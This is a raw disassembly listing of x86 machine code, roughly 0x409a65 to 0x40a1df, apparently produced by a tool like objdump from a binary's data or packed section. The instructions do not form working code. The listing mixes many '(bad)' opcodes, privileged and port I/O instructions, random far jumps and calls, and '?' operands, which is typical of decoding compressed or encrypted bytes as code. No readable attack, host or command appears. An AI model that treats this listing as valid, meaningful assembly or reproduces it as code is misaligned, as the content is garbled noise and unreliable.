  409a65:	pinsrw mm5,WORD PTR [edx*4-0x7b05daac],0xf5
  409a6e:	jb     0x409a08
  409a70:	sub    eax,0x7adc8b45
  409a75:	pop    ss
  409a76:	loope  0x409a81
  409a78:	jg     0x409a43
  409a7a:	sbb    dh,BYTE PTR [eax+0x31]
  409a7d:	xchg   ebx,eax
  409a7e:	cdq    
  409a7f:	outs   dx,BYTE PTR ds:[esi]
  409a80:	jle    0x409a35
  409a82:	xor    cl,BYTE PTR [edi-0x17f991e4]
  409a88:	data16 adc bh,BYTE PTR [eax-0x60]
  409a8c:	loopne 0x409acc
  409a8e:	imul   ebp,ecx,0xffffffbd
  409a91:	aam    0xe9
  409a93:	fild   QWORD PTR [esi+0x5776c4b1]
  409a99:	mov    ebp,0x6ec9bef2
  409a9e:	fild   QWORD PTR [ecx-0x424322e6]
  409aa4:	jg     0x409adf
  409aa6:	pop    ss
  409aa7:	sbb    bl,cl
  409aa9:	pop    ss
  409aaa:	stos   DWORD PTR es:[edi],eax
  409aab:	sbb    al,0x84
  409aad:	out    0x79,al
  409aaf:	add    ch,BYTE PTR [ebx]
  409ab1:	inc    ebp
  409ab2:	xchg   ecx,eax
  409ab3:	fiadd  WORD PTR fs:[ebx+0x68]
  409ab7:	mov    esi,0xc562b1fc
  409abc:	fcom   DWORD PTR [eax-0x67a52443]
  409ac2:	add    BYTE PTR [eax],dl
  409ac4:	sub    BYTE PTR [ebp+0x7],cl
  409ac7:	xchg   edx,eax
  409ac8:	mov    esp,0x69e51ae5
  409acd:	xor    esp,DWORD PTR [edx]
  409acf:	cmp    DWORD PTR [ecx],ebp
  409ad1:	cmc    
  409ad2:	js     0x409ab2
  409ad4:	cs mov dl,0xee
  409ad7:	pop    edx
  409ad8:	fcom   QWORD PTR [edi]
  409ada:	sbb    BYTE PTR [esi+edx*1+0x1],0xa5
  409adf:	fdivr  QWORD PTR fs:[edi+0x4da5a7e2]
  409ae6:	push   ebp
  409ae7:	sbb    al,0xae
  409ae9:	and    al,0x3a
  409aeb:	mov    dl,0xa2
  409aed:	xor    DWORD PTR [eax+0x35],esi
  409af0:	xlat   BYTE PTR ds:[ebx]
  409af1:	in     al,dx
  409af2:	mov    bl,0xe1
  409af4:	inc    ebp
  409af5:	pop    ebp
  409af6:	js     0x409b25
  409af8:	mov    dl,0xf7
  409afa:	inc    esi
  409afb:	inc    edi
  409afc:	jb     0x409ad8
  409afe:	dec    esi
  409aff:	ret    0x9533
  409b02:	dec    esp
  409b03:	cld    
  409b04:	add    ah,BYTE PTR [edi-0x5c]
  409b07:	test   al,0xa1
  409b09:	lods   eax,DWORD PTR ds:[esi]
  409b0a:	ret    
  409b0b:	hlt    
  409b0c:	push   0x64acafc8
  409b11:	mov    bl,0x7f
  409b13:	push   eax
  409b14:	pop    ecx
  409b15:	loopne 0x409af4
  409b17:	xchg   esp,eax
  409b18:	mov    eax,0xf61f3c8c
  409b1d:	dec    esi
  409b1e:	dec    edi
  409b1f:	mov    ds:0xaf3dd854,eax
  409b24:	cmovg  eax,DWORD PTR [ebx-0x1544650c]
  409b2b:	pop    es
  409b2c:	sub    BYTE PTR [edi*8-0x3c7b085d],cl
  409b33:	loope  0x409aea
  409b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b36:	adc    BYTE PTR [ebx+0x2fec060f],bl
  409b3c:	or     BYTE PTR [esi+0x6d],al
  409b3f:	lock dec esp
  409b41:	ret    0xfba3
  409b44:	test   eax,0x8f6f6f0f
  409b49:	(bad)  
  409b4a:	(bad)  
  409b4b:	sub    ch,BYTE PTR [ecx+0xc1846ba]
  409b51:	and    eax,0x3e4e9e50
  409b56:	fcomip st,st(4)
  409b58:	inc    eax
  409b59:	test   BYTE PTR [edx-0x254b25e],dl
  409b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b60:	stos   BYTE PTR es:[edi],al
  409b61:	adc    BYTE PTR [edi],ch
  409b63:	jns    0x409b9c
  409b65:	(bad)  
  409b66:	(bad)  
  409b67:	lods   al,BYTE PTR ds:[esi]
  409b68:	sti    
  409b69:	or     eax,0x6f15df90
  409b6e:	sub    al,0x9e
  409b70:	es sar dl,0xac
  409b74:	call   0xd5e43abc
  409b79:	imul   edx,DWORD PTR [eax-0x5ad3e905],0x67fa890e
  409b83:	and    BYTE PTR [edi+0x41],bh
  409b86:	retf   0x902a
  409b89:	inc    BYTE PTR [edi+edi*4-0x303cdb42]
  409b90:	cmp    BYTE PTR [ebx+0x44],bl
  409b93:	mov    bl,BYTE PTR [edx+0x4e]
  409b96:	mov    dl,0x59
  409b98:	jl     0x409b45
  409b9a:	sub    ah,BYTE PTR [ebp-0x7e27072f]
  409ba0:	push   edi
  409ba1:	aaa    
  409ba2:	gs jp  0x409bb7
  409ba5:	into   
  409ba6:	in     al,dx
  409ba7:	mov    dh,0xd
  409ba9:	lods   al,BYTE PTR ds:[esi]
  409baa:	jge    0x409b8e
  409bac:	(bad)
  409bb0:	inc    edx
  409bb1:	dec    ecx
  409bb2:	add    cl,al
  409bb4:	test   BYTE PTR [ebx-0x33d52409],ch
  409bba:	xor    esi,DWORD PTR [edx+0x58]
  409bbd:	vmovhpd QWORD PTR [edi-0x42],xmm1
  409bc2:	dec    eax
  409bc3:	ins    DWORD PTR es:[edi],dx
  409bc4:	jno    0x409bb6
  409bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bc7:	pop    edi
  409bc8:	add    eax,0x8b171d7
  409bcd:	mov    cl,0xc3
  409bcf:	popf   
  409bd0:	(bad)  
  409bd1:	cmp    esp,esp
  409bd3:	xchg   BYTE PTR [ebx-0x5839bc0c],dh
  409bd9:	fs test dl,bh
  409bdc:	(bad)  
  409bdd:	mov    edx,DWORD PTR [edx+0x6c]
  409be0:	jmp    FWORD PTR [edx-0x924d63d]
  409be6:	(bad)  
  409be7:	cli    
  409be8:	(bad)
  409beb:	lods   eax,DWORD PTR ds:[esi]
  409bec:	push   0x42bb3d75
  409bf1:	mov    ah,0xc6
  409bf3:	sbb    edx,DWORD PTR [esi-0x4d58c90b]
  409bf9:	xchg   DWORD PTR [ebp+0x2cee02ff],ebx
  409bff:	dec    ebp
  409c00:	call   0xcdb6:0x9ea3aeff
  409c07:	adc    BYTE PTR [ebp+edi*8-0x679a0c6b],cl
  409c0e:	push   DWORD PTR [esi+ebx*2-0x12041062]
  409c15:	push   ebp
  409c16:	xor    BYTE PTR [edx],dh
  409c18:	push   cs
  409c19:	dec    edi
  409c1a:	or     ebx,DWORD PTR [edx]
  409c1c:	pop    ss
  409c1d:	call   DWORD PTR [esi+ebp*2]
  409c20:	scas   eax,DWORD PTR es:[edi]
  409c21:	add    cl,bl
  409c23:	inc    eax
  409c24:	test   eax,0xcaf416e2
  409c29:	cld    
  409c2a:	fwait
  409c2b:	shl    DWORD PTR [edi-0x19457ae5],0xee
  409c32:	xchg   esp,eax
  409c33:	gs push esi
  409c35:	bound  eax,QWORD PTR ds:0x2c5ff23a
  409c3b:	sti    
  409c3c:	mov    dh,0x18
  409c3e:	mov    bl,0xe6
  409c40:	cmp    BYTE PTR [ecx+0x6],bh
  409c43:	inc    ebx
  409c44:	xchg   edx,eax
  409c45:	mov    al,ds:0x78af8257
  409c4a:	fnstenv [ecx+0x78]
  409c4d:	adc    bl,BYTE PTR [edi+0x6e8f8c14]
  409c53:	cld    
  409c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c55:	and    eax,0xa3c06a6
  409c5a:	pop    edx
  409c5b:	add    bh,BYTE PTR [ecx]
  409c5d:	cmc    
  409c5e:	call   0x5b9b:0x542f0e2e
  409c65:	xor    dl,BYTE PTR [ebp-0x4e55a281]
  409c6b:	sub    BYTE PTR [edi-0x41],al
  409c6e:	mov    edx,0xda501afe
  409c73:	xor    BYTE PTR [eax-0x763cc0b5],0x94
  409c7a:	sub    DWORD PTR [esi],ebp
  409c7c:	jmp    0xd21f:0x3d9a2f51
  409c83:	xor    bh,BYTE PTR [eax+0x5650cbb4]
  409c89:	das    
  409c8a:	fnstcw WORD PTR [eax]
  409c8c:	jns    0x409cd7
  409c8e:	xchg   BYTE PTR [ecx-0x29ca5c2a],ch
  409c94:	ficom  DWORD PTR [esi-0x644675f7]
  409c9a:	inc    ecx
  409c9b:	adc    dl,BYTE PTR [ebx+0x17]
  409c9e:	pop    es
  409c9f:	add    eax,0xc88a1546
  409ca4:	loop   0x409d12
  409ca6:	or     edx,DWORD PTR [esi]
  409ca8:	loop   0x409c8e
  409caa:	sahf   
  409cab:	lods   eax,DWORD PTR ds:[esi]
  409cac:	sar    BYTE PTR [edi+0x7e3b6d18],1
  409cb2:	mov    edi,fs
  409cb4:	stc    
  409cb5:	mov    cs,WORD PTR [edx-0x17]
  409cb8:	mov    esp,0x1186dafc
  409cbd:	mov    bl,0x3c
  409cbf:	aaa    
  409cc0:	mov    al,ds:0x88b2ddbd
  409cc5:	ss cmp al,0x60
  409cc8:	and    BYTE PTR [ecx+edi*4-0x44],dh
  409ccc:	xor    DWORD PTR [ebx+0x7ccd7e14],ebx
  409cd2:	mov    al,ds:0x1fed2270
  409cd7:	jns    0x409cd6
  409cd9:	mov    WORD PTR [eax+0x1],gs
  409cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cdd:	sbb    DWORD PTR [edi+0x33],esi
  409ce0:	(bad)  
  409ce4:	inc    ecx
  409ce5:	aas    
  409ce6:	pop    ds
  409ce7:	cmp    al,0xd3
  409ce9:	sahf   
  409cea:	jb     0x409d1a
  409cec:	cdq    
  409ced:	and    DWORD PTR [eax+0x67],ecx
  409cf0:	jns    0x409d17
  409cf2:	ins    DWORD PTR es:[edi],dx
  409cf3:	sub    eax,0x5b1b6aee
  409cf8:	pop    edi
  409cf9:	mov    eax,0xf823ee1f
  409cfe:	in     al,0xad
  409d00:	xchg   edx,eax
  409d01:	push   es
  409d02:	nop
  409d03:	int    0xa8
  409d05:	stos   BYTE PTR es:[edi],al
  409d06:	out    dx,eax
  409d07:	and    BYTE PTR [eax+0x56],0x6c
  409d0b:	adc    eax,0xc3a91c0
  409d10:	inc    edx
  409d11:	fidivr WORD PTR [ecx-0x22]
  409d14:	mov    esi,0x9503c8da
  409d19:	ret    0x87f7
  409d1c:	out    0x5f,al
  409d1e:	and    ecx,DWORD PTR [eax]
  409d20:	in     al,0xf7
  409d22:	fisub  WORD PTR [esi+0x67c8ce3]
  409d28:	cmp    BYTE PTR [edx],al
  409d2a:	push   ds
  409d2b:	or     al,ah
  409d2d:	and    BYTE PTR [ebx+0x2],dl
  409d30:	push   ds
  409d31:	pop    ebp
  409d32:	outs   dx,DWORD PTR ds:[esi]
  409d33:	(bad)  
  409d34:	fldcw  WORD PTR [esi-0x40]
  409d37:	lea    edi,[edx]
  409d39:	jbe    0x409d92
  409d3b:	arpl   WORD PTR [ecx-0x5e],cx
  409d3e:	add    DWORD PTR [ebx-0x71],esi
  409d41:	les    ebp,FWORD PTR [edx+eax*2]
  409d44:	dec    edx
  409d45:	imul   DWORD PTR [esi-0x2b]
  409d48:	or     ch,BYTE PTR [edx-0x24]
  409d4b:	jae    0x409d0d
  409d4d:	jl     0x409d95
  409d4f:	adc    ah,BYTE PTR [eax-0x48ef0029]
  409d55:	and    edx,DWORD PTR [ebp+0x1bcca307]
  409d5b:	test   eax,0x592f4e63
  409d60:	sbb    bh,BYTE PTR [edi-0x2a]
  409d63:	inc    ebp
  409d64:	pop    es
  409d65:	iret   
  409d66:	loopne 0x409da5
  409d68:	inc    ecx
  409d69:	add    eax,0x54ba21a0
  409d6e:	scas   al,BYTE PTR es:[edi]
  409d6f:	push   ds
  409d70:	adc    BYTE PTR [eax+0x2e53706a],dh
  409d76:	xor    esi,DWORD PTR [eax-0x27994f23]
  409d7c:	loopne 0x409d94
  409d7e:	inc    edx
  409d7f:	xor    ecx,ebp
  409d81:	aam    0xd4
  409d83:	and    eax,0x88462244
  409d88:	jle    0x409d1f
  409d8a:	sbb    bl,BYTE PTR [ecx+0x5cb298bf]
  409d90:	and    esp,DWORD PTR [eax]
  409d92:	lds    eax,FWORD PTR [eax]
  409d94:	(bad)  
  409d96:	and    dl,0x7d
  409d99:	out    0xb9,eax
  409d9b:	fcmove st,st(2)
  409d9d:	icebp  
  409d9e:	cmp    BYTE PTR [edx],0x18
  409da1:	xor    DWORD PTR [edi+ecx*8+0x5f],0x58
  409da6:	sub    ah,BYTE PTR [edx+0x14229f14]
  409dac:	retf   0x4259
  409daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409db0:	js     0x409db9
  409db2:	or     BYTE PTR [esi+eax*1+0x68],al
  409db6:	sbb    eax,0x85674e46
  409dbb:	fidiv  DWORD PTR [edi+0x69]
  409dbe:	ins    DWORD PTR es:[edi],dx
  409dbf:	or     DWORD PTR [edi-0x4a42ba42],ebp
  409dc5:	(bad)  [ecx+0x1e5596ef]
  409dcb:	jns    0x409e30
  409dcd:	cmc    
  409dce:	(bad)  [ecx]
  409dd0:	pushf  
  409dd1:	and    eax,0x253f6bd4
  409dd6:	lock and DWORD PTR [ebx+0x69],0xffffffb8
  409ddb:	or     dl,bh
  409ddd:	mov    al,0x40
  409ddf:	fwait
  409de0:	jne    0x409e41
  409de2:	out    0xb7,al
  409de4:	or     al,0x44
  409de6:	enter  0x957,0xf4
  409dea:	enter  0x745,0x23
  409dee:	pushf  
  409def:	fwait
  409df0:	adc    eax,0x8c4f5fb4
  409df5:	std    
  409df6:	mov    al,0xd1
  409df8:	sub    BYTE PTR [ecx+ebp*2-0x19ea6391],ch
  409dff:	retf   0x86a4
  409e02:	fidivr DWORD PTR [ebx+0x4e]
  409e05:	sub    al,0x67
  409e07:	xchg   ecx,eax
  409e08:	out    0x9b,al
  409e0a:	ror    BYTE PTR [ebx+0x3fd15f7a],0x4f
  409e11:	sbb    DWORD PTR [ebx],esi
  409e13:	adc    edx,DWORD PTR [edi]
  409e15:	or     al,0xb0
  409e17:	rcr    BYTE PTR [esi-0x52466e84],cl
  409e1d:	(bad)  
  409e1e:	jge    0x409e6e
  409e20:	inc    ebx
  409e21:	ret    0xc7c3
  409e24:	or     DWORD PTR [ecx+0x3d],ebp
  409e27:	les    ebx,FWORD PTR [ecx]
  409e29:	call   0x55a1cc19
  409e2e:	test   DWORD PTR [eax],0x6a09d6b0
  409e34:	or     BYTE PTR [eax],dl
  409e36:	mov    WORD PTR [eax+0x6b91d57b],?
  409e3c:	push   es
  409e3d:	pop    esi
  409e3e:	jmp    0x409ddb
  409e40:	adc    BYTE PTR [eax],bl
  409e42:	clc    
  409e43:	aaa    
  409e44:	cli    
  409e45:	out    dx,al
  409e46:	mov    al,0x17
  409e48:	fisttp QWORD PTR [edx-0x58]
  409e4b:	mov    edx,0x16a70629
  409e50:	jo     0x409e65
  409e52:	jno    0x409e08
  409e54:	lods   al,BYTE PTR ds:[esi]
  409e55:	sar    BYTE PTR ds:0xffcef834,1
  409e5b:	(bad)  
  409e5c:	sar    DWORD PTR [ecx],cl
  409e5e:	xor    al,dh
  409e60:	test   BYTE PTR [eax+0x51],cl
  409e63:	xchg   edx,eax
  409e64:	mov    esp,0xf2a53479
  409e69:	sub    ah,BYTE PTR [esi]
  409e6b:	ja     0x409e06
  409e6d:	enter  0x3d30,0xaf
  409e71:	inc    edi
  409e72:	jge    0x409e8a
  409e74:	fisttp WORD PTR ds:0x194ef4c4
  409e7a:	mov    dl,0x43
  409e7c:	je     0x409e17
  409e7e:	mov    esi,0x44842a90
  409e83:	fstp   DWORD PTR [edx+0x47c4d853]
  409e89:	fist   DWORD PTR [ebx+0x14]
  409e8c:	pop    ebx
  409e8d:	pop    edx
  409e8e:	aas    
  409e8f:	push   ebp
  409e90:	fcmovnu st,st(4)
  409e92:	fmul   st,st(5)
  409e94:	xlat   BYTE PTR ds:[ebx]
  409e95:	sub    eax,0x98f83d54
  409e9a:	shr    DWORD PTR [esi],cl
  409e9c:	je     0x409e69
  409e9e:	sar    DWORD PTR [eax],0x3f
  409ea1:	jecxz  0x409eda
  409ea3:	(bad)  
  409ea4:	in     al,0x69
  409ea6:	xchg   DWORD PTR [eax+0x2d],ebp
  409ea9:	enter  0xf03f,0xc7
  409ead:	ins    BYTE PTR es:[edi],dx
  409eae:	push   ss
  409eaf:	xchg   esp,eax
  409eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eb1:	enter  0xb47,0xbb
  409eb5:	imul   edi,DWORD PTR [ebx-0x5a],0x7881c592
  409ebc:	xchg   ecx,eax
  409ebd:	lds    edx,FWORD PTR [ebx-0x65]
  409ec0:	sbb    BYTE PTR [eax-0x64],ah
  409ec3:	scas   eax,DWORD PTR es:[edi]
  409ec4:	push   ebx
  409ec5:	dec    ebp
  409ec6:	pop    esi
  409ec7:	repz add eax,0xe04287a5
  409ecd:	pop    es
  409ece:	or     BYTE PTR [ebx],0x94
  409ed1:	(bad)  
  409ed2:	out    dx,al
  409ed3:	in     al,0xeb
  409ed5:	and    BYTE PTR [edx],ah
  409ed7:	aad    0xa2
  409ed9:	aam    0x7e
  409edb:	shl    DWORD PTR ds:0x3b1a7756,0x32
  409ee2:	xchg   BYTE PTR [eax-0x4d88f0d6],ah
  409ee8:	imul   ebx,eax,0xfffffffe
  409eeb:	jne    0x409e90
  409eed:	push   ebp
  409eee:	les    esi,FWORD PTR [ebx+0x71]
  409ef1:	(bad)  
  409ef2:	cdq    
  409ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ef4:	xchg   ebx,eax
  409ef5:	adc    edx,DWORD PTR [eax+0x4128c934]
  409efb:	inc    ebp
  409efc:	dec    eax
  409efd:	scas   eax,DWORD PTR es:[edi]
  409efe:	add    BYTE PTR [esi+0x4bd1d9ad],dh
  409f04:	sub    bh,ch
  409f06:	push   0x96b2ca80
  409f0b:	pop    edi
  409f0c:	xor    BYTE PTR [ebx],dl
  409f0e:	xchg   ecx,eax
  409f0f:	or     al,0xf9
  409f11:	jecxz  0x409eb0
  409f13:	jp     0x409f2c
  409f15:	or     al,0xb
  409f17:	imul   edi,DWORD PTR [esi],0xffffffcf
  409f1a:	jmp    0x409f52
  409f1c:	pusha  
  409f1d:	out    dx,al
  409f1e:	rol    DWORD PTR [edi-0x4e],0xc5
  409f22:	jae    0x409f0a
  409f24:	xchg   bx,ax
  409f26:	sbb    al,0x7f
  409f28:	loope  0x409f0e
  409f2a:	fsub   st,st(6)
  409f2c:	xchg   ebp,eax
  409f2d:	sti    
  409f2e:	pop    esi
  409f2f:	xor    eax,0xd8c2fdd6
  409f34:	mov    ss,WORD PTR [edx+0x4b832fd0]
  409f3a:	(bad)  
  409f3b:	ins    BYTE PTR es:[edi],dx
  409f3c:	out    0x6c,eax
  409f3e:	cwde   
  409f3f:	pusha  
  409f40:	fnstsw WORD PTR [ebp-0x65]
  409f43:	and    esi,ebp
  409f45:	and    BYTE PTR [ecx-0x41],bh
  409f48:	xor    DWORD PTR [eax+0x7e],eax
  409f4b:	outs   dx,BYTE PTR ds:[esi]
  409f4c:	fisttp QWORD PTR [edx-0x1e1b4fb3]
  409f52:	and    al,0x4a
  409f54:	mov    ah,0x5e
  409f56:	or     ecx,edx
  409f58:	in     eax,dx
  409f59:	xor    DWORD PTR [eax],esi
  409f5b:	cli    
  409f5c:	sbb    DWORD PTR [ebp+0x35eaa4f1],esi
  409f62:	dec    edx
  409f63:	sub    eax,0x2be53089
  409f68:	je     0x409f61
  409f6a:	popf   
  409f6b:	mov    esp,0xd4c3b6e6
  409f70:	mov    ah,0xf9
  409f72:	sbb    ecx,ebx
  409f74:	aam    0xa2
  409f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f77:	data16 or bh,BYTE PTR [ecx]
  409f7a:	pushf  
  409f7b:	test   al,0xf2
  409f7d:	push   ebx
  409f7e:	pop    ecx
  409f7f:	fist   DWORD PTR [edi]
  409f81:	jbe    0x409f18
  409f83:	fild   DWORD PTR [edx+0xdb92abc]
  409f89:	sub    eax,0xb8b2e405
  409f8e:	enter  0x44a9,0xa6
  409f92:	xor    BYTE PTR [esi],ch
  409f94:	(bad)  
  409f95:	jp     0x409ffe
  409f97:	push   esi
  409f98:	push   ebx
  409f99:	dec    ecx
  409f9a:	aaa    
  409f9b:	daa    
  409f9c:	cmp    al,0x52
  409f9e:	dec    eax
  409f9f:	(bad)  [esi-0x1db13906]
  409fa5:	jnp    0x409f33
  409fa7:	repz fdivr st(3),st
  409faa:	bound  ecx,QWORD PTR [edi+0x2dbc429c]
  409fb0:	dec    edx
  409fb1:	rcr    DWORD PTR [ecx-0x145b6c03],0xaf
  409fb8:	jbe    0x409f4f
  409fba:	or     dl,bh
  409fbc:	sbb    DWORD PTR [edx+ebp*2-0x718de928],0xffffffe6
  409fc4:	lds    ebx,FWORD PTR [ebx+eiz*4+0x30]
  409fc8:	push   0xffffffc0
  409fca:	sbb    bh,cl
  409fcc:	cwde   
  409fcd:	in     al,0xeb
  409fcf:	push   es
  409fd0:	(bad)  
  409fd1:	in     eax,0x9e
  409fd3:	pop    ebx
  409fd4:	jbe    0x409fc7
  409fd6:	mov    dl,0xe3
  409fd8:	sbb    ebx,edi
  409fda:	mov    ebx,0xe01effd2
  409fdf:	cmp    dh,BYTE PTR [eax+eiz*4+0x7b]
  409fe3:	jbe    0x409fce
  409fe5:	cli    
  409fe6:	mov    al,0x6b
  409fe8:	(bad)  
  409fe9:	inc    eax
  409fea:	or     DWORD PTR [ebx+0x75],esp
  409fed:	es sar dh,cl
  409ff0:	aam    0x7b
  409ff2:	sub    eax,0xf114fe8f
  409ff7:	xor    eax,0xe90721ee
  409ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ffd:	adc    eax,0xe05f5513
  40a002:	inc    edx
  40a003:	xor    al,0xac
  40a005:	ja     0x40a027
  40a007:	jl     0x40a01e
  40a009:	pusha  
  40a00a:	aaa    
  40a00b:	das    
  40a00c:	lock add al,0x6f
  40a00f:	mov    al,0x87
  40a011:	aad    0x46
  40a013:	mov    ecx,cs
  40a015:	retf   
  40a016:	lods   eax,DWORD PTR ds:[esi]
  40a017:	jmp    0x7e68dc36
  40a01c:	jge    0x409fe9
  40a01e:	test   BYTE PTR [eax-0x131209f5],bh
  40a024:	sub    BYTE PTR [ebx+0x697bef44],al
  40a02a:	pop    es
  40a02b:	ret    0xfc22
  40a02e:	mov    edi,?
  40a030:	mov    cs,WORD PTR [esi]
  40a032:	test   al,0xdf
  40a034:	pop    esi
  40a035:	scas   eax,DWORD PTR es:[edi]
  40a036:	mov    eax,ds:0x4a384984
  40a03b:	jnp    0x40a09d
  40a03d:	outs   dx,BYTE PTR ds:[esi]
  40a03e:	dec    edx
  40a03f:	inc    ebp
  40a040:	pop    eax
  40a041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a042:	jle    0x40a0ab
  40a044:	push   ebp
  40a045:	push   eax
  40a046:	cmp    dh,ah
  40a048:	in     eax,dx
  40a049:	shl    BYTE PTR [ebx-0x219a90b7],0xbc
  40a050:	mov    esi,0x8ea5657b
  40a055:	sti    
  40a056:	push   ss
  40a057:	mov    ds:0x73e01a17,al
  40a05c:	iret   
  40a05d:	sub    DWORD PTR [ecx+ecx*4+0x1b],esi
  40a061:	xchg   ebp,eax
  40a062:	cdq    
  40a063:	scas   al,BYTE PTR es:[edi]
  40a064:	add    eax,0xcc479250
  40a069:	adc    al,BYTE PTR [esi-0x77054f81]
  40a06f:	mov    al,ds:0x5a1d1774
  40a074:	push   esp
  40a075:	push   ss
  40a076:	dec    esi
  40a077:	stos   DWORD PTR es:[edi],eax
  40a078:	int3   
  40a079:	add    eax,0x5c554ee5
  40a07e:	xchg   DWORD PTR [esi],ebp
  40a080:	mov    bl,0x5e
  40a082:	adc    eax,DWORD PTR [ebx]
  40a084:	mov    eax,0x4610638c
  40a089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a08a:	adc    ebp,DWORD PTR [ebx]
  40a08c:	sub    bl,BYTE PTR [ebp-0x7a]
  40a08f:	ds dec edi
  40a091:	mov    edx,0x194178ac
  40a096:	cmp    DWORD PTR [ebx-0x4f1b78a3],edx
  40a09c:	cmp    al,0xad
  40a09e:	cmp    al,BYTE PTR [edx-0x61]
  40a0a1:	int    0xf7
  40a0a3:	loop   0x40a115
  40a0a5:	sbb    al,0x1e
  40a0a7:	sahf   
  40a0a8:	xor    DWORD PTR [edx*8+0x3e0f45c9],ebp
  40a0af:	cmp    bh,0x18
  40a0b2:	shl    DWORD PTR [ecx+0x55a0cbbc],0xfa
  40a0b9:	or     bl,BYTE PTR [esp+esi*4-0x16d17f6f]
  40a0c0:	dec    ecx
  40a0c1:	xchg   ecx,eax
  40a0c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0c3:	mov    bh,BYTE PTR [ecx+0x7f]
  40a0c6:	jecxz  0x40a07a
  40a0c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0c9:	mov    dh,bh
  40a0cb:	cdq    
  40a0cc:	lds    esi,FWORD PTR [eax+0x24d1d5cf]
  40a0d2:	test   DWORD PTR [ecx-0x58b247ca],esp
  40a0d8:	xchg   esp,eax
  40a0d9:	mov    eax,ds:0x7b92a9c2
  40a0de:	mov    ecx,0xb8e80b10
  40a0e3:	xor    BYTE PTR [edi],bl
  40a0e5:	pop    esi
  40a0e6:	sub    DWORD PTR [ebx+ebx*1+0x2b],0xb41ca713
  40a0ee:	clc    
  40a0ef:	add    BYTE PTR [esi+esi*1-0x53adba48],dl
  40a0f6:	jmp    0x4f866def
  40a0fb:	pop    ds
  40a0fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0fd:	sbb    esi,DWORD PTR [esp+esi*2-0x34]
  40a101:	jae    0x40a0a6
  40a103:	adc    al,0xef
  40a105:	jle    0x40a0bd
  40a107:	popa   
  40a108:	or     eax,0x12bf1b78
  40a10d:	out    dx,al
  40a10e:	(bad)  
  40a10f:	out    dx,al
  40a110:	fsub   QWORD PTR [ecx]
  40a112:	mov    ecx,0x6de2d753
  40a117:	repz icebp 
  40a119:	(bad)  
  40a11a:	mov    dh,0x4c
  40a11c:	dec    esp
  40a11d:	xor    DWORD PTR [edi+0x10],edx
  40a120:	and    DWORD PTR [edi],ebp
  40a122:	sbb    cl,BYTE PTR [ecx]
  40a124:	not    BYTE PTR [esi]
  40a126:	xchg   ch,dl
  40a128:	imul   ebp,DWORD PTR [edx],0xbea4ad86
  40a12e:	test   eax,0xe3508d1
  40a133:	int    0x40
  40a135:	cli    
  40a136:	sbb    esp,DWORD PTR [ebx-0x6c8220db]
  40a13c:	sahf   
  40a13d:	cwde   
  40a13e:	std    
  40a13f:	arpl   WORD PTR [ebp-0x5c577a1b],di
  40a145:	loop   0x40a15a
  40a147:	jno    0x40a107
  40a149:	outs   dx,DWORD PTR ds:[esi]
  40a14a:	pop    es
  40a14b:	stos   DWORD PTR es:[edi],eax
  40a14c:	call   0x106:0x3a902469
  40a153:	and    ebx,esp
  40a155:	inc    ebx
  40a156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a157:	adc    DWORD PTR [ebx],esp
  40a159:	jns    0x40a125
  40a15b:	xchg   edi,eax
  40a15c:	sti    
  40a15d:	pusha  
  40a15e:	repz arpl WORD PTR [eax+0x20],bx
  40a162:	sbb    al,0x69
  40a164:	lods   al,BYTE PTR ds:[esi]
  40a165:	mov    al,BYTE PTR [esi]
  40a167:	jecxz  0x40a12d
  40a169:	rcr    BYTE PTR [edx],1
  40a16b:	xchg   edx,eax
  40a16c:	add    ecx,DWORD PTR [eax-0x64]
  40a16f:	imul   edi,edi,0x20
  40a172:	ds mov al,0x9b
  40a175:	mov    eax,0xde9bb1cc
  40a17a:	xchg   edx,eax
  40a17b:	(bad)  
  40a17c:	inc    esi
  40a17d:	mov    ?,WORD PTR [ebx]
  40a17f:	lds    ecx,FWORD PTR [ebx]
  40a181:	mov    fs,WORD PTR [eax+0x64d4038]
  40a187:	rol    DWORD PTR [ecx-0x4e],1
  40a18a:	pop    esi
  40a18b:	jmp    0x40a18e
  40a18d:	push   edx
  40a18e:	or     DWORD PTR [ebx+0x54],ecx
  40a191:	arpl   WORD PTR [ecx-0x18],cx
  40a194:	jno    0x40a1e3
  40a196:	inc    eax
  40a197:	pop    ss
  40a198:	(bad)  
  40a199:	jne    0x40a1e2
  40a19b:	das    
  40a19c:	(bad)  
  40a19d:	jae    0x40a1a4
  40a19f:	sbb    al,0x7
  40a1a1:	popf   
  40a1a2:	andps  xmm7,xmm4
  40a1a5:	(bad)  
  40a1a6:	jge    0x40a1d0
  40a1a8:	add    eax,0x3bce3c36
  40a1ad:	xchg   esi,eax
  40a1ae:	or     al,0xc5
  40a1b0:	mov    ebx,0x48eb95eb
  40a1b5:	in     al,0x96
  40a1b7:	sbb    eax,0x72a0d7a9
  40a1bc:	shr    BYTE PTR [eax],1
  40a1be:	aas    
  40a1bf:	fld    st(6)
  40a1c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1c2:	icebp  
  40a1c3:	popf   
  40a1c4:	loopne 0x40a18c
  40a1c6:	xchg   esi,eax
  40a1c7:	sbb    al,0x9e
  40a1c9:	gs cld 
  40a1cb:	fmul   DWORD PTR [edx+0x1]
  40a1ce:	fadd   st,st(3)
  40a1d0:	repnz push ebp
  40a1d2:	sub    edx,edx
  40a1d4:	in     eax,0xa1
  40a1d6:	adc    ah,BYTE PTR [edx+0x6456915c]
  40a1dc:	sub    edx,edx
  40a1de:	iret   
  40a1df:	sub    al,0x81
